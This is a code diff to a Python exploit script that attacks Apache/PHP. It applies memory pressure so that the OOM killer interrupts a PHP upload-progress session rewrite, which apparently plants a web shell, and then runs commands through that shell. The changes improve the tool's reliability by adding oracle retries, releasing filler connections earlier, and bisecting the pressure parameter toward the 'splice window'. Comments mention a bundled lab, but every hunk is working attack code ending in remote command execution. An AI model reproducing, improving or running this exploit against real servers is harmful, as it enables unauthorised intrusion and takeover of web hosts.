@@ -183,14 +183,20 @@ def oracle_stable(host: str, port: int, sid: str,
 
     The session file lives on disk and survives any process death (the
     OOM may also select the apache master). When the target is restarting
-    at the moment we ask, wait for it and re-read instead of throwing the
-    whole attempt - and its mixed state - away.
+    at the moment we ask - or the serving child dies mid-response and we
+    get an empty body - wait and re-read instead of throwing the whole
+    attempt, and its mixed state, away.
     """
     for _ in range(tries):
         try:
-            return oracle(host, port, sid)
+            rep = oracle(host, port, sid)
         except OSError:
             time.sleep(0.75)
+            continue
+        if rep.get("raw") == "":
+            time.sleep(0.75)      # empty body: child died mid-response
+            continue
+        return rep
     return {"raw": "target never came back", "dead": True}
 
 
@@ -308,11 +314,25 @@ def attempt(host: str, port: int, h: int, c_len: int, r_len: int) -> dict:
     res["victim"] = ev
     res["drop_ms"] = round(drop_ms, 1)
 
+    # Release the pressure BEFORE reading the oracle: the consumer has to
+    # read the (up to 16 MiB) session file and must not OOM on the way.
+    # Only the fillers are released - the victim/carrier stay open, since
+    # aborting them would trigger PHP's upload-progress cleanup, which
+    # rewrites the session and destroys the mixed state.
+    for s in fillers:
+        try:
+            s.close()
+        except OSError:
+            pass
+    time.sleep(0.3)
+
     rep = oracle_stable(host, port, sid)
     outcome, k = classify(rep, c_len, r_len)
     res["outcome"] = outcome
     res["k"] = k
     res["size"] = rep.get("size")
+    if outcome == "oracle-failed":
+        res["raw"] = str(rep.get("raw", ""))[:200]
 
     hit = outcome == "hit"
     res["hit"] = hit
@@ -321,27 +341,6 @@ def attempt(host: str, port: int, h: int, c_len: int, r_len: int) -> dict:
                                  f"{SHELL}?c="
                                  f"{urllib.parse.quote(res.get('cmd', 'id'))}")
         res["output"] = cmd_out.decode(errors="replace")
-
-    # Release the pressure BEFORE reading the oracle: the consumer has to
-    # read the (up to 16 MiB) session file and must not OOM on the way.
-    # The victim/carrier stay open - aborting them would trigger PHP's
-    # upload-progress cleanup, which rewrites the session and destroys the
-    # mixed state before the oracle can observe it.
-    for s in fillers:
-        try:
-            s.close()
-        except OSError:
-            pass
-    rep2 = (oracle_stable(host, port, sid)
-            if outcome == "oracle-failed" else rep)
-    if outcome == "oracle-failed":
-        res["outcome"], k = classify(rep2, c_len, r_len)
-        res["k"] = k
-        res["hit"] = res["outcome"] == "hit"
-        if res["hit"]:
-            cmd_out = http_get_retry(host, port, f"{SHELL}?c="
-                                     f"{urllib.parse.quote(res.get('cmd', 'id'))}")
-            res["output"] = cmd_out.decode(errors="replace")
 
     for s in [carrier, victim]:
         try:
@@ -379,14 +378,19 @@ def exploit(host: str, port: int, command: str, max_attempts: int = 40,
               f"k_target={lab.k_target()}")
 
     # Pre-loaded pressure H (anonymous, held in PHP's multipart parser).
-    # With the bundled lab (limit 64m, baseline ~13m after gc) the victim's
-    # own serialization crosses the limit at X = 51m - H; the window that
-    # both keeps the apache master out of the OOM's reach (X >= 16m) and
-    # lands k in the splice window is H in ~[30m, 38m].
+    # What must fit below the limit before the victim starts writing is
+    # B = baseline + 7 filler runtimes (~2 MiB of PHP each - real RSS the
+    # raw field bytes do not account for) + H. The OOM then has to land
+    # inside the victim's session rewrite: after serialization
+    # (B + the string must still fit) but within the first E' bytes of
+    # the pwrite. That is a ~2 MiB band, far narrower than a fixed-step
+    # walk can reliably find - so H is bisected: early (OOM before the
+    # write) lowers the ceiling, late/nooom (write ran past the window)
+    # raises the floor, in-window k gets a proportional correction.
     h = 22_000_000
-    h_min, h_max = 10_000_000, 30_000_000
-    step = 4_000_000           # damped: halved whenever the direction flips
-    last_dir = 0
+    h_min, h_max = 2_000_000, 30_000_000
+    lo, hi = h_min, h_max      # bisection bracket on the pressure
+    step = 4_000_000           # max proportional correction inside window
 
     for i in range(1, max_attempts + 1):
         if not wait_server(host, port):
@@ -412,21 +416,22 @@ def exploit(host: str, port: int, command: str, max_attempts: int = 40,
 
         out = res.get("outcome")
         k = res.get("k")
-        if out == "nooom":
-            delta = +step               # never crossed: more pressure
-        elif k is not None:
-            # k = const - h, so h += (k - k_target) moves k onto target
+        if k is not None and lab.f_offset() <= k < lab.e_offset():
+            # inside the splice window: proportional correction
+            # (k = const - h, so h += (k - k_target) moves k onto target)
             delta = k - lab.k_target()
             delta = max(-step, min(step, delta))
-        else:
-            delta = +step // 2          # oracle hiccup: nudge upward
-
-        d = 1 if delta > 0 else (-1 if delta < 0 else 0)
-        if last_dir and d and d != last_dir:
-            step = max(step // 2, 1_000_000)
-        if d:
-            last_dir = d
-        h = max(h_min, min(h_max, h + delta))
+            h = max(lo, min(hi, h + delta))
+        elif out == "early" or (k is not None and k < lab.f_offset()):
+            # OOM before the write: pressure too high - bisect down
+            hi = h
+            h = max(lo, (lo + hi) // 2)
+        elif out in ("late", "nooom"):
+            # the write ran past the window (or never aborted): the
+            # pressure is too low - bisect up
+            lo = h
+            h = min(hi, (lo + hi) // 2)
+        # oracle noise (oracle-failed/unknown): hold h steady
 
     return {"error": "no hit within attempt budget"}
 
